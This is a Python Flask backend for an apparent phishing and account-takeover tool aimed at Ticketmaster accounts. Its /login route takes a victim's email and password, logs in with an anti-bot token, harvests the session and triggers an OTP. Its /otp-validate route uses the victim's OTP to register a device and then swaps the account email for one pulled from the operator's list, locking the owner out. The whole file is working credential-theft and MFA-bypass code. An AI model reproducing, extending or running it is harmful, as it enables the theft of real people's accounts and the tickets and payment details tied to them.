from flask import Flask, request, jsonify
from flask_cors import CORS

import uuid
import time
import hashlib
import base64
import json
import re
import os
import random
import string
import requests
import ticketmaster_api as tm
import query_db as db

app = Flask(__name__)
CORS(app)

def build_session_from_db(email):
    # Retrieve the latest session data from the database
    session_data = db.get_session(email)

    if session_data:
        # Create a new requests session
        session = requests.Session()

        # Load cookies into the session
        cookies = session_data['cookies']
        for cookie_name, cookie_value in cookies.items():
            session.cookies.set(cookie_name, cookie_value)

        # Load headers into the session
        headers = session_data['headers']
        session.headers.update(headers)

        # Store the OTP link, client token, and account age in variables
        otp_link = session_data['otp_link']
        client_token = session_data['client_token']
        account_age = session_data['account_age']

        print(f"Session for {email} built successfully. OTP link: {otp_link}, Client token: {client_token}, Account age: {account_age}")
        return session, otp_link, client_token, account_age
    else:
        return None, None, None, None
    
# Internal method to handle login logic
def login_user(email, password):
    code_verifier = tm.gen_code_verifier()
    login_url = tm.gen_login_url()
    _px2 = tm.gen_px2()
    session, resp = tm.post_login(email, password, _px2, login_url)
    print(resp)
    if "continueLink" in resp or "auth.ticketmaster.com/account" in resp:
        return session, {"status": "success", "message": "Login successful"},login_url, resp
    elif "The user is not found" in resp:
        return None, {"status": "fail", "message": "Invalid email"},login_url, resp
    elif "Credentials mismatch" in resp:
        return None, {"status": "fail", "message": "Invalid password"},login_url, resp
    elif "The account is locked" in resp:
        return None, {"status": "fail", "message": "Account Locked"},login_url, resp
    else:
        return None, {"status": "fail", "message": "Unknown Error"},login_url, resp

def store_session_data(email, session, otp_link=None, client_token=None, account_age=None):
    # Parse cookies and headers from the session
    cookies = session.cookies.get_dict()
    headers = dict(session.headers)

    # Call the insert_session function to store the data in the database
    db.insert_session(email, otp_link, client_token, account_age, cookies, headers)

    #OTP STUFF
def validate_otp(email, otp_code):

    pass

def get_email():
    file_path = 'utils/emails.txt'
    # Open the file in read mode and read all lines
    with open(file_path, 'r') as file:
        lines = file.readlines()

    # Check if the file is not empty
    if lines:
        email = lines[0]
        # Remove the first line (top line)
        lines = lines[1:]

        # Write the remaining lines back to the file
        with open(file_path, 'w') as file:
            file.writelines(lines)
    return email
        
@app.route('/login', methods=['POST'])
def login():
    if not request.is_json:
        return jsonify({"status": "fail", "message": "Invalid request, JSON expected"}), 400

    data = request.get_json()

    # Check if email and password are in the JSON payload
    if 'email' not in data or 'password' not in data:
        return jsonify({"status": "fail", "message": "Email and password are required"}), 400

    email = data['email']
    password = data['password']

    # Call the internal method to process the login
    session, result, login_url, resp = login_user(email, password)
    print(result)
    print('return if fail')
    if 'fail' in result['status']:
        return jsonify(result), 400


    code = tm.parse_code(resp)
    device = tm.generate_device_string()
    ex_link = json.loads(resp)['_links']['continueLink']['source']
    print('exchange link ', ex_link)
    session, resp = tm.exchange_link(session, ex_link)
    print(resp)
    session, resp = tm.client_token(session)
    client_token = json.loads(resp)['clientToken']
    session, resp = tm.capture_info(session)
    account_age = json.loads(resp)['accountCreatedDate'].split('-')[0]
    session, resp = tm.get_OTP_link(session, client_token, login_url)
    print(resp)
    resp = json.loads(resp)

    email_verification_link = resp['_links']['verifyDeviceViaEmail']['source']
    session, resp = tm.send_OTP(session, email_verification_link)
    validate_otp = json.loads(resp)['_links']['validateOtp']['source']
    store_session_data(email, session, validate_otp, client_token, account_age)
        # Return the result as a JSON response
    if "fail" in result:
        return jsonify(result), 401
    else:
        return jsonify(result), 200
    
@app.route('/otp-validate', methods=['POST'])
def otp_validate():
    if not request.is_json:
        return jsonify({"status": "fail", "message": "Invalid request, JSON expected"}), 400

    data = request.get_json()

    # Check if email and otp_code are in the JSON payload
    if 'email' not in data or 'otp' not in data:
        return jsonify({"status": "fail", "message": "Email and OTP code are required"}), 400

    email = data['email']
    otp_code = data['otp']

    # Call the internal method to validate the OTP
    session, otp_link, client_token, account_age = build_session_from_db(email)
    print('client token')
    print(client_token)

    session, resp = tm.verify_OTP(session, otp_link, otp_code)
    if "OTP validation failed" in resp:
        #they gave bad otp smh
         return jsonify({"status": "fail", "message": "OTP Incorrect. Please refresh and try again"}), 400
    
    otp_token = json.loads(resp)['verifiedOtpToken']
    session, resp = tm.save_device(session, client_token, otp_token,)
    print(resp)
    verified_device_token = json.loads(resp)['verifiedDeviceToken']
    email = get_email()
    session, resp = tm.update_email(session, email, verified_device_token)

    print(resp)
    if ('OTP validation failed' in resp):
        #wrong OTP code
        return jsonify({"status": "fail", "message": "Invalid OTP. Please try again"}), 400
    elif ('Update is too soon' in resp):
        return jsonify({"status": "success", "message": "Successfully Verified"}), 400
    # Return the result as a JSON response
    return jsonify(resp), 200
if __name__ == '__main__':
    app.run(debug=True)
    
